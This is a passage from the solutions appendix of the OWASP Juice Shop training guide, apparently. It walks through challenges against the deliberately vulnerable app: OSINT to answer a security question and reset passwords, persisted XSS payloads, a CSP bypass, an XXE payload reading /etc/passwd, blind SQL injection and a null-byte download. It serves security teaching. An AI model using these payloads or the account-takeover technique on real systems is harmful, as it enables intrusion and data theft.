<h3 id="_reset_the_password_of_bjoerns_owasp_account_via_the_forgot_password_mechanism"><a class="anchor" href="#_reset_the_password_of_bjoerns_owasp_account_via_the_forgot_password_mechanism"></a>Reset the password of Bjoern&#8217;s OWASP account via the Forgot Password mechanism</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Visit <a href="http://localhost:3000/#/forgot-password" class="bare">http://localhost:3000/#/forgot-password</a> and provide
<code>bjoern@owasp.org</code> as your <em>Email</em>.</p>
</li>
<li>
<p>You will notice that the security question Bjoern chose is <em>Name of your
favorite pet?</em></p>
</li>
<li>
<p>Find Bjoern&#8217;s Twitter profile at <a href="https://twitter.com/bkimminich" class="bare">https://twitter.com/bkimminich</a></p>
</li>
<li>
<p>Going through his status updates or media you&#8217;ll spot a few photos of a cute cat and eventually also find the Tweet <a href="https://twitter.com/bkimminich/status/1441659996589207555" class="bare">https://twitter.com/bkimminich/status/1441659996589207555</a> or maybe the more recent <a href="https://twitter.com/bkimminich/status/1594985736650035202" class="bare">https://twitter.com/bkimminich/status/1594985736650035202</a></p>
</li>
<li>
<p>The text of this Tweet spoilers the name of the cat as "Zaya"</p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/forgot-password" class="bare">http://localhost:3000/#/forgot-password</a> again and once more provide
<code>bjoern@owasp.org</code> as your <em>Email</em>.</p>
</li>
<li>
<p>In the subsequently appearing form, provide <code>Zaya</code> as <em>Name of your
favorite pet?</em></p>
</li>
<li>
<p>Then type any <em>New Password</em> and matching <em>Repeat New Password</em></p>
</li>
<li>
<p>Click <em>Change</em> to solve this challenge</p>
</li>
</ol>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/zaya_rowing.png" alt="Zaya &quot;rowing&quot; with a half-amputated hind leg in a Tweet of Bjoern">
</div>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/zaya_flippered.png" alt="Zaya in a box in another Tweet of Bjoern">
</div>
</div>
<div class="sect3">
<h4 id="_alternative_name_drop_on_youtube"><a class="anchor" href="#_alternative_name_drop_on_youtube"></a>Alternative name-drop on YouTube</h4>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Find Bjoern&#8217;s
<a href="https://www.youtube.com/playlist?list=PLV9O4rIovHhO1y8_78GZfMbH6oznyx2g2"><em>OWASP Juice Shop</em> playlist on Youtube</a></p>
</li>
<li>
<p>Watch
<a href="https://www.youtube.com/watch?v=Lu0-kDdtVf4">BeNeLux Day 2018: Juice Shop: OWASP&#8217;s Most Broken Flagship - Björn Kimminich</a></p>
</li>
<li>
<p>This conference talk recording immediately dives into a demo of the
Juice Shop application in which Bjoern starts registering a new
account 3:59 into the video (<a href="https://youtu.be/Lu0-kDdtVf4?t=239" class="bare">https://youtu.be/Lu0-kDdtVf4?t=239</a>)</p>
</li>
<li>
<p>Bjoern picks <em>Name of your favorite pet?</em> as his security question
and - live on camera - answers it truthfully with "Zaya", the name of
his family&#8217;s adorable three-legged cat.</p>
</li>
</ol>
</div>
</div>
<div class="sect3">
<h4 id="_partial_hints_about_bjoerns_choice_of_security_answer"><a class="anchor" href="#_partial_hints_about_bjoerns_choice_of_security_answer"></a>Partial hints about Bjoern&#8217;s choice of security answer</h4>
<div class="paragraph">
<p>The <strong>user profile picture</strong> of his account at
<a href="http://localhost:3000/assets/public/images/uploads/12.jpg" class="bare">http://localhost:3000/assets/public/images/uploads/12.jpg</a> shows his
pet cat.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/zaya_window.jpg" alt="Zaya at window">
</div>
</div>
<div class="paragraph">
<p>Retrieving another photo of his cat is the subject of the
<a href="../part2/improper-input-validation.md#retrieve-the-photo-of-bjoerns-cat-in-melee-combat-mode">Retrieve the photo of Bjoern&#8217;s cat in "melee combat-mode"</a>
challenge. The corresponding image caption "😼 #zatschi
#whoneedsfourlegs" also leaks the nickname "Zatschi" of the pet - which
is cute, but (intentionally) not very helpful to find out her real name,
though.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/zaya_melee.jpg" alt="Zaya in melee combat mode">
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_reset_jims_password_via_the_forgot_password_mechanism"><a class="anchor" href="#_reset_jims_password_via_the_forgot_password_mechanism"></a>Reset Jim&#8217;s password via the Forgot Password mechanism</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Visit <a href="http://localhost:3000/#/forgot-password" class="bare">http://localhost:3000/#/forgot-password</a> and provide
<code>jim@juice-sh.op</code> as your <em>Email</em> to learn that <em>Your eldest siblings
middle name?</em> is Jim&#8217;s chosen security question</p>
</li>
<li>
<p>Jim (whose <code>UserId</code> happens to be <code>2</code>) left some breadcrumbs in the
application which reveal his identity</p>
<div class="ulist">
<ul>
<li>
<p>A product review for the <em>OWASP Juice Shop-CTF Velcro Patch</em>
stating <em>"Looks so much better on my uniform than the boring
Starfleet symbol."</em></p>
</li>
<li>
<p>Another product review <em>"Fresh out of a replicator."</em> on the <em>Green
Smoothie</em> product</p>
</li>
<li>
<p>A <em>Recycling Request</em> associated to his saved address <em>"Room 3F
121, Deck 5, USS Enterprise, 1701"</em></p>
</li>
</ul>
</div>
</li>
<li>
<p>It should eventually become obvious that <em>James T. Kirk</em> is the only
viable solution to the question of Jim&#8217;s identity</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/Star_Trek_William_Shatner.JPG" alt="James T. Kirk">
</div>
</div>
</li>
<li>
<p>Visit <a href="https://en.wikipedia.org/wiki/James_T._Kirk" class="bare">https://en.wikipedia.org/wiki/James_T._Kirk</a> and read the
<a href="https://en.wikipedia.org/wiki/James_T._Kirk#Depiction">Depiction</a>
section</p>
</li>
<li>
<p>It tells you that Jim has a brother named <em>George Samuel Kirk</em></p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/forgot-password" class="bare">http://localhost:3000/#/forgot-password</a> and provide
<code>jim@juice-sh.op</code> as your <em>Email</em></p>
</li>
<li>
<p>In the subsequently appearing form, provide <code>Samuel</code> as <em>Your eldest
siblings middle name?</em></p>
</li>
<li>
<p>Then type any <em>New Password</em> and matching <em>Repeat New Password</em></p>
</li>
<li>
<p>Click <em>Change</em> to solve this challenge</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/jim_forgot-password.png" alt="Password reset for Jim">
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_upload_a_file_larger_than_100_kb"><a class="anchor" href="#_upload_a_file_larger_than_100_kb"></a>Upload a file larger than 100 kB</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>The client-side validation prevents uploads larger than 100 kB.</p>
</li>
<li>
<p>Craft a <code>POST</code> request to <a href="http://localhost:3000/file-upload" class="bare">http://localhost:3000/file-upload</a> with a
form parameter <code>file</code> that contains a PDF file of more than 100 kB
but less than 200 kB.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/invalid-size_upload.png" alt="Larger file upload">
</div>
</div>
</li>
<li>
<p>The response from the server will be a <code>204</code> with no content, but the
challenge will be successfully solved.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>Files larger than 200 kB are rejected by an upload size check on server
side with a <code>500</code> error stating <code>Error: File too large</code>.</p>
</div>
</div>
<div class="sect2">
<h3 id="_upload_a_file_that_has_no_pdf_or_zip_extension"><a class="anchor" href="#_upload_a_file_that_has_no_pdf_or_zip_extension"></a>Upload a file that has no .pdf or .zip extension</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Craft a <code>POST</code> request to <a href="http://localhost:3000/file-upload" class="bare">http://localhost:3000/file-upload</a> with a
form parameter <code>file</code> that contains a non-PDF file with a size of
less than 200 kB.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/invalid-type_upload.png" alt="Non-PDF upload">
</div>
</div>
</li>
<li>
<p>The response from the server will be a <code>204</code> with no content, but the
challenge will be successfully solved.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>Uploading a non-PDF file larger than 100 kB will solve
<a href="#upload-a-file-larger-than-100-kb">Upload a file larger than 100 kB</a>
simultaneously.</p>
</div>
</div>
<div class="sect2">
<h3 id="_perform_a_persisted_xss_attack_bypassing_a_client_side_security_mechanism"><a class="anchor" href="#_perform_a_persisted_xss_attack_bypassing_a_client_side_security_mechanism"></a>Perform a persisted XSS attack bypassing a client-side security mechanism</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Submit a POST request to <a href="http://localhost:3000/api/Users" class="bare">http://localhost:3000/api/Users</a> with</p>
<div class="ulist">
<ul>
<li>
<p><code>{"email": "&lt;iframe src=\"javascript:alert(`xss</code>)\"&gt;", "password":
"xss"}` as body</p>
</li>
<li>
<p>and <code>application/json</code> as <code>Content-Type</code> header.</p>
</li>
</ul>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/xss2_postman.png" alt="XSS request in PostMan">
</div>
</div>
</li>
<li>
<p>Log in to the application with an admin.</p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/administration" class="bare">http://localhost:3000/#/administration</a>.</p>
</li>
<li>
<p>An alert box with the text "xss" should appear.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/xss2_alert.png" alt="XSS alert box">
</div>
</div>
</li>
<li>
<p>Close this box. Notice the somewhat broken looking row in the
<em>Registered Users</em> table?</p>
</li>
<li>
<p>Click the "eye"-button in that row.</p>
</li>
<li>
<p>A modal overlay dialog with the user details opens where the attack
string is rendered as harmless text.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/xss2_user-modal.png" alt="XSS user in details dialog">
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_perform_a_persisted_xss_attack_without_using_the_frontend_application_at_all"><a class="anchor" href="#_perform_a_persisted_xss_attack_without_using_the_frontend_application_at_all"></a>Perform a persisted XSS attack without using the frontend application at all</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in to the application with any user.</p>
</li>
<li>
<p>Copy your <code>Authorization</code> header from any HTTP request submitted via
browser.</p>
</li>
<li>
<p>Submit a POST request to <a href="http://localhost:3000/api/Products" class="bare">http://localhost:3000/api/Products</a> with</p>
<div class="ulist">
<ul>
<li>
<p><code>{"name": "XSS", "description": "&lt;iframe
src=\"javascript:alert(`xss</code>)\"&gt;", "price": 47.11}` as body,</p>
</li>
<li>
<p><code>application/json</code> as <code>Content-Type</code></p>
</li>
<li>
<p>and <code>Bearer ?</code> as <code>Authorization</code> header, replacing the <code>?</code> with
the token you copied from the browser.</p>
</li>
</ul>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/xss3_postman.png" alt="XSS request in PostMan">
</div>
</div>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/search" class="bare">http://localhost:3000/#/search</a>.</p>
</li>
<li>
<p>An alert box with the text "xss" should appear.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/xss3_alert.png" alt="XSS alert box">
</div>
</div>
</li>
<li>
<p>Close this box. Notice the product row which has a frame border in
the description in the <em>All Products</em> table</p>
</li>
<li>
<p>Click the "eye"-button next to that row.</p>
</li>
<li>
<p>Another alert box with the text "xss" should appear. After closing it
the actual details dialog pops up showing the same frame border.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/xss3_product-modal_alert.png" alt="After closing the XSS alert box in product details">
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_retrieve_the_content_of_cwindowssystem_ini_or_etcpasswd_from_the_server"><a class="anchor" href="#_retrieve_the_content_of_cwindowssystem_ini_or_etcpasswd_from_the_server"></a>Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Solve the
<a href="#use-a-deprecated-b2b-interface-that-was-not-properly-shut-down">Use a deprecated B2B interface that was not properly shut down</a>
challenge.</p>
</li>
<li>
<p>Prepare an XML file which defines and uses an external entity
<code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</code> (or <code>&lt;!ENTITY xxe
SYSTEM "file:///C:/Windows/system.ini" &gt;]&gt;</code> on Windows).</p>
</li>
<li>
<p>Upload this file through the <em>File Complaint</em> dialog and observe the
Javascript console while doing so. It should give you an error
message containing the parsed XML, including the contents of the
local system file!</p>
</li>
</ol>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlightjs highlight"><code class="language-xml hljs" data-lang="xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;

&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;
        &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;

&lt;trades&gt;
    &lt;metadata&gt;
        &lt;name&gt;Apple Juice&lt;/name&gt;
        &lt;trader&gt;
            &lt;foo&gt;&amp;xxe;&lt;/foo&gt;
            &lt;name&gt;B. Kimminich&lt;/name&gt;
        &lt;/trader&gt;
        &lt;units&gt;1500&lt;/units&gt;
        &lt;price&gt;106&lt;/price&gt;
        &lt;name&gt;Lemon Juice&lt;/name&gt;
        &lt;trader&gt;
            &lt;name&gt;B. Kimminich&lt;/name&gt;
        &lt;/trader&gt;
        &lt;units&gt;4500&lt;/units&gt;
        &lt;price&gt;195&lt;/price&gt;
    &lt;/metadata&gt;
&lt;/trades&gt;</code></pre>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_challenges_4"><a class="anchor" href="#_challenges_4"></a>⭐⭐⭐⭐ Challenges</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_gain_access_to_any_access_log_file_of_the_server"><a class="anchor" href="#_gain_access_to_any_access_log_file_of_the_server"></a>Gain access to any access log file of the server</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Solve the
<a href="#access-a-confidential-document">Access a confidential document</a> or
any related challenges which will bring the exposed <code>/ftp</code> folder to
your attention.</p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/ftp" class="bare">http://localhost:3000/ftp</a> and notice the file
<code>incident-support.kdbx</code> which is needed for
<a href="../part2/security-misconfiguration.md#log-in-with-the-support-teams-original-user-credentials">Log in with the support team&#8217;s original user credentials</a>
and indicates that some support team is performing its duties from
the public Internet and possibly with VPN access.</p>
</li>
<li>
<p>Guess luckily or run a brute force attack with e.g.
<a href="https://github.com/zaproxy/zap-extensions/tree/beta/src/org/zaproxy/zap/extension/bruteforce">OWASP ZAPs DirBuster plugin</a>
for a possibly exposed directory containing the log files.</p>
</li>
<li>
<p>Following
<a href="../part2/sensitive-data-exposure.md#gain-access-to-any-access-log-file-of-the-server">the hint to drill down deeper than one level</a>,
you will at some point end up with
<a href="http://localhost:3000/support/logs" class="bare">http://localhost:3000/support/logs</a>.</p>
</li>
<li>
<p>Inside you will find at least one <code>access.log</code> of the current day.
Open or download it to solve this challenge.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/access-log_folder.png" alt="Exposed folder containing access logs">
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_bypass_the_content_security_policy_and_perform_an_xss_attack_on_a_legacy_page"><a class="anchor" href="#_bypass_the_content_security_policy_and_perform_an_xss_attack_on_a_legacy_page"></a>Bypass the Content Security Policy and perform an XSS attack on a legacy page</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in as any user.</p>
</li>
<li>
<p>Visit our user profile page at <a href="http://localhost:3000/profile" class="bare">http://localhost:3000/profile</a>.</p>
</li>
<li>
<p>Type in any <em>Username</em> and click the <em>Set Username</em> button.</p>
</li>
<li>
<p>Notice that the username is displayed beneath the profile image.</p>
</li>
<li>
<p>Change the username into <code>&lt;script&gt;alert(`xss</code>)&lt;/script&gt;` and click
<em>Set Username</em>.</p>
</li>
<li>
<p>Notice the displayed username under the profile picture now is
<code>lert(`xss</code>)` while in the <em>Username</em> field it shows
<code>lert(`xss</code>)&lt;/script&gt;` - both a clear indication that the malicious
input was sanitized. Obviously the sanitization was not very
sophisticated, as the input was quite mangled and even the closing
<code>&lt;script&gt;</code> tag survived the procedure.</p>
</li>
<li>
<p>Change the username into <code>&lt;&lt;a|ascript&gt;alert(`xss</code>)&lt;/script&gt;` and
click <em>Set Username</em>.</p>
</li>
<li>
<p>The naive sanitizer only removes <code>&lt;a|a</code> effectively changing the
username into <code>&lt;script&gt;alert(`xss</code>)&lt;/script&gt;` but you&#8217;ll notice
that the script is still not executed!</p>
</li>
<li>
<p>The username shows as <code>\</code> on the screen and the
<code>&lt;script&gt;alert(`xss</code>)&lt;/script&gt;` is part of the DOM. It seems that
its execution was blocked by the Content Security Policy (CSP) of the
page.</p>
</li>
<li>
<p>Bypassing the CSP requires to exploit a totally different attack
vector on the profile page: The <em>Image URL</em> field.</p>
</li>
<li>
<p>Set the <em>Image URL</em> to some valid image URL, e.g.
<a href="https://placekitten.com/300/300" class="bare">https://placekitten.com/300/300</a> and click <em>Link Image</em> while
inspecting the network traffic via your browser&#8217;s DevTools.</p>
</li>
<li>
<p>Notice how the <code>Content-Security-Policy</code> response header has been
changed in the subsequent call to <a href="http://localhost:3000/profile" class="bare">http://localhost:3000/profile</a>?
It now contains an entry like
<code>/assets/public/images/uploads/17.jpg;</code>, which is the location of
the successfully uploaded image.</p>
</li>
<li>
<p>Try setting the <em>Image URL</em> again, but now to some invalid image
URL, e.g. <a href="http://definitely.not.an/image.png" class="bare">http://definitely.not.an/image.png</a>. While the linking
fails and your profile will show a broken image, the CSP header will
now contain <code>http://definitely.not.an/image.png;</code> - the originally
supplied URL.</p>
</li>
<li>
<p>This influence on the CSP header - plus the fact that the first
encountered entry in case of duplicates always wins - is fatal for
the application. We can basically overwrite the CSP with one of our
own choosing.</p>
</li>
<li>
<p>Set <code>https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval'
https://code.getmdl.io http://ajax.googleapis.com</code> as <em>Image URL</em>
and click _Link Image.</p>
</li>
<li>
<p>Refresh the page to give the browser the chance to load the tampered
CSP and enjoy the alert box popping up!</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_order_the_christmas_special_offer_of_2014"><a class="anchor" href="#_order_the_christmas_special_offer_of_2014"></a>Order the Christmas special offer of 2014</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Open <a href="http://localhost:3000/#/search" class="bare">http://localhost:3000/#/search</a> and reload the page with <code>F5</code>
while observing the <em>Network</em> tab in your browser&#8217;s DevTools</p>
</li>
<li>
<p>Recognize the <code>GET</code> request
<a href="http://localhost:3000/rest/products/search?q=" class="bare">http://localhost:3000/rest/products/search?q=</a> which returns the
product data.</p>
</li>
<li>
<p>Submitting any SQL payloads via the <em>Search</em> field in the navigation
bar will do you no good, as it is only applying filters onto the
entire data set what was retrieved with a singular call upon loading
the page.</p>
</li>
<li>
<p>In that light, the <code>q=</code> parameter on the
<a href="http://localhost:3000/rest/products/search" class="bare">http://localhost:3000/rest/products/search</a> endpoint would not even
be needed, but might be a relic from a different implementation of
the search functionality. Test this theory by submitting
<a href="http://localhost:3000/rest/products/search?q=orange" class="bare">http://localhost:3000/rest/products/search?q=orange</a> which should
give you a result such as</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/search-result_orange.png" alt="JSON search result for &quot;orange&quot; keyword">
</div>
</div>
</li>
<li>
<p>Submit <code>';</code> as <code>q</code> via
<a href="http://localhost:3000/rest/products/search?q='" class="bare">http://localhost:3000/rest/products/search?q='</a>;</p>
</li>
<li>
<p>You will receive an error page with a <code>SQLITE_ERROR: syntax error</code>
mentioned, indicating that SQL Injection is indeed possible.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/search-error_sql-syntax.png" alt="SQL search query syntax error">
</div>
</div>
</li>
<li>
<p>You are now in the area of Blind SQL Injection, where trying create
valid queries is a matter of patience, observance and a bit of luck.</p>
</li>
<li>
<p>Varying the payload into <code>'--</code> for <code>q</code> results in a <code>SQLITE_ERROR:
incomplete input</code>. This error happens due to two (now unbalanced)
parenthesis in the query.</p>
</li>
<li>
<p>Using <code>'))--</code> for <code>q</code> fixes the syntax and successfully retrieves all
products, including the (logically deleted) Christmas offer. Take
note of its <code>id</code> (which should be <code>10</code>)</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/search-result_christmas.png" alt="JSON search result with the Christmas special">
</div>
</div>
</li>
<li>
<p>Go to <a href="http://localhost:3000/#/login" class="bare">http://localhost:3000/#/login</a> and log in as any user.</p>
</li>
<li>
<p>Add any regularly available product into you shopping basket to
prevent problems at checkout later. Memorize your <code>BasketId</code> value
in the request payload (when viewing the Network tab) or find the
same information in the <code>bid</code> variable in your browser&#8217;s Session
Storage (in the Application tab).</p>
</li>
<li>
<p>Craft and send a <code>POST</code> request to
<a href="http://localhost:3000/api/BasketItems" class="bare">http://localhost:3000/api/BasketItems</a> with</p>
<div class="ulist">
<ul>
<li>
<p><code>{"BasketId": "&lt;Your Basket ID&gt;", "ProductId": 10, "quantity": 1}</code>
as body</p>
</li>
<li>
<p>and <code>application/json</code> as <code>Content-Type</code></p>
</li>
</ul>
</div>
</li>
<li>
<p>Go to <a href="http://localhost:3000/#/basket" class="bare">http://localhost:3000/#/basket</a> to verify that the "Christmas
Super-Surprise-Box (2014 Edition)" is in the basket</p>
</li>
<li>
<p>Click <em>Checkout</em> on the <em>Your Basket</em> page to solve the challenge.</p>
</li>
</ol>
</div>
<div class="sect3">
<h4 id="_alternative_path_without_any_sql_injection"><a class="anchor" href="#_alternative_path_without_any_sql_injection"></a>Alternative path without any SQL Injection</h4>
<div class="paragraph">
<p>This solution involves a lot less hacking &amp; sophistication but requires
more attention &amp; a good portion of shrewdness.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Retrieve all products as JSON by calling
<a href="http://localhost:3000/rest/products/search?q=" class="bare">http://localhost:3000/rest/products/search?q=</a></p>
</li>
<li>
<p>Write down all <code>id</code>s that are <em>missing</em> in the otherwise sequential
numeric range</p>
</li>
<li>
<p>Perform step 12. and 13. from above solution for all those missing
<code>id</code>s</p>
</li>
<li>
<p>Once you hit the "Christmas Super-Surprise-Box (2014 Edition)" click
<em>Checkout</em> for instant success!</p>
</li>
</ol>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_identify_an_unsafe_product_that_was_removed_from_the_shop_and_inform_the_shop_which_ingredients_are_dangerous"><a class="anchor" href="#_identify_an_unsafe_product_that_was_removed_from_the_shop_and_inform_the_shop_which_ingredients_are_dangerous"></a>Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Solve
<a href="#order-the-christmas-special-offer-of-2014">Order the Christmas special offer of 2014</a>
but enumerate all deleted products until you come across "Rippertuer
Special Juice"</p>
</li>
<li>
<p>Notice the warning <em>"This item has been made unavailable because of
lack of safety standards."</em> in its description, indicating that this
is the product you need to investigate for this challenge</p>
</li>
<li>
<p>Further notice the partial list of ingredients in the description
namely <em>"Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora,
Bael Aegle marmelos&#8230;&#8203; and others"</em></p>
</li>
<li>
<p>Submitting either or all of the above ingredients at
<a href="http://localhost:3000/#/contact" class="bare">http://localhost:3000/#/contact</a> will <strong>not</strong> solve this challenge -
it must be some unlisted ingredients that create a dangerous
combination.</p>
</li>
<li>
<p>A simple Google search for <code>Cherymoya Annona cherimola Jabuticaba
Myrciaria cauliflora Bael Aegle marmelos</code> should bring up several
results, one of them being a blog post "Top 20 Fruits You Probably
Don&#8217;t Know" from 2011. Visit this post at
<a href="https://listverse.com/2011/07/08/top-20-fruits-you-probably-dont-know" class="bare">https://listverse.com/2011/07/08/top-20-fruits-you-probably-dont-know</a></p>
</li>
<li>
<p>Scrolling through the list of replies you will notice
<a href="https://listverse.com/2011/07/08/top-20-fruits-you-probably-dont-know/#comment-4541753139">a particular comment from user <em>Localhorst</em></a>
saying <em>"Awesome, some of these fruits also made it into our
"Rippertuer Special Juice"! <a href="https://pastebin.com/90dUgd7s"" class="bare">https://pastebin.com/90dUgd7s"</a></em></p>
</li>
<li>
<p>Visit <a href="https://pastebin.com/90dUgd7s" class="bare">https://pastebin.com/90dUgd7s</a> to find a PasteBin paste titled
"Rippertuer Special Juice Ingredients" containing a JSON document
with many exotic fruits in it, each with its name as <code>type</code> and a
detailed <code>description</code></p>
</li>
<li>
<p>When carefully reading all fruit descriptions you will notice a
warning on the <code>Hueteroneel</code> fruit that <em>"this coupled with Eurogium
Edule was sometimes found fatal"</em></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/rippertuer-ingredients.png" alt="Ingredients list of &quot;Rippertuer Special Juice&quot;">
</div>
</div>
</li>
<li>
<p>As <code>Eurogium Edule</code> is also on the very same list of ingredients,
these two must be the ones you are looking for</p>
</li>
<li>
<p>Submit a comment containing both <code>Eurogium Edule</code> and <code>Hueteroneel</code>
via <a href="http://localhost:3000/#/contact" class="bare">http://localhost:3000/#/contact</a> to solve this challenge</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_find_the_hidden_easter_egg"><a class="anchor" href="#_find_the_hidden_easter_egg"></a>Find the hidden easter egg</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Use the <em>Poison Null Byte</em> attack described in
<a href="#access-a-developers-forgotten-backup-file">Access a developer&#8217;s forgotten backup file</a>&#8230;&#8203;</p>
</li>
<li>
<p>&#8230;&#8203;to download <a href="http://localhost:3000/ftp/eastere.gg%2500.md" class="bare">http://localhost:3000/ftp/eastere.gg%2500.md</a></p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_apply_some_advanced_cryptanalysis_to_find_the_real_easter_egg"><a class="anchor" href="#_apply_some_advanced_cryptanalysis_to_find_the_real_easter_egg"></a>Apply some advanced cryptanalysis to find the real easter egg</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Get the encrypted string from the <code>eastere.gg</code> from the
<a href="#find-the-hidden-easter-egg">Find the hidden easter egg</a> challenge:
<code>L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==</code></p>
</li>
<li>
<p>Base64-decode this into
<code>/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt</code></p>
</li>
<li>
<p>Trying this as a URL will not work. Notice the recurring patterns
(<code>rtt</code>, <code>gur</code> etc.) in the above string</p>
</li>
<li>
<p>ROT13-decode this into
<code>/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg</code></p>
</li>
<li>
<p>Visit
<a href="http://localhost:3000/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg" class="bare">http://localhost:3000/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg</a></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/planet_orangeuze.png" alt="Planet Orangeuze">
</div>
</div>
</li>
<li>
<p>Marvel at <em>the real</em> easter egg: An interactive 3D scene of <em>Planet
Orangeuze</em>!</p>
</li>
</ol>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>ROT13 ("rotate by 13 places", sometimes hyphenated ROT-13) is a simple
letter substitution cipher that replaces a letter with the letter 13
letters after it in the alphabet. ROT13 is a special case of the
Caesar cipher, developed in ancient Rome.</p>
</div>
<div class="paragraph">
<p>Because there are 26 letters (2×13) in the basic Latin alphabet, ROT13
is its own inverse; that is, to undo ROT13, the same algorithm is
applied, so the same action can be used for encoding and decoding. The
algorithm provides virtually no cryptographic security, and is often
cited as a canonical example of weak encryption.<sup class="footnote" id="_footnote_1">[<a id="_footnoteref_2" class="footnote" href="#_footnotedef_2" title="View footnote.">2</a>]</sup></p>
</div>
</blockquote>
</div>
</div>
<div class="sect2">
<h3 id="_successfully_redeem_an_expired_campaign_coupon_code"><a class="anchor" href="#_successfully_redeem_an_expired_campaign_coupon_code"></a>Successfully redeem an expired campaign coupon code</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Open <code>main.js</code> in your Browser&#8217;s dev tools and search for
<code>campaign</code>.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/minified_js-campaigncode.png" alt="Campaign code in minified JavaScript">
</div>
</div>
</li>
<li>
<p>You will find a <code>this.campaigns</code> assignment of an object containing
various campaign codes. Depending on when you are reading this book,
one or more of these might be expired. Let&#8217;s continue with the oldest
available one, which is <code>WMNSDY2019</code>.</p>
</li>
<li>
<p>A bit further down in the minified code you will notice a function
<code>applyCoupon()</code> that uses <code>this.campaigns</code> and in particular the
contained <code>validOn</code> timestamp of a coupon.</p>
</li>
<li>
<p>Ignoring that validity check and just submitting <code>WMNSDY2019</code> will
yield an <code>Invalid Coupon.</code> error, as you would expect. This is
because of the second part of the assertion <code>this.clientDate ===
e.validOn</code>.</p>
</li>
<li>
<p>Converting <code>validOn: 15519996e5</code> of the <code>WMNSDY2019</code> coupon into a
JavaScript date will tell you that this campaign was active on March
8th 2019 only: Women&#8217;s Day!</p>
</li>
<li>
<p>Set the time of your computer to March 8th 2019 and try to submit the
code again.</p>
</li>
<li>
<p>This time it will be accepted! Proceed to <em>Checkout</em> to get the
challenge solved.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_access_a_developers_forgotten_backup_file"><a class="anchor" href="#_access_a_developers_forgotten_backup_file"></a>Access a developer&#8217;s forgotten backup file</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Browse to <a href="http://localhost:3000/ftp" class="bare">http://localhost:3000/ftp</a> (like in
<a href="#access-a-confidential-document">Access a confidential document</a>.</p>
</li>
<li>
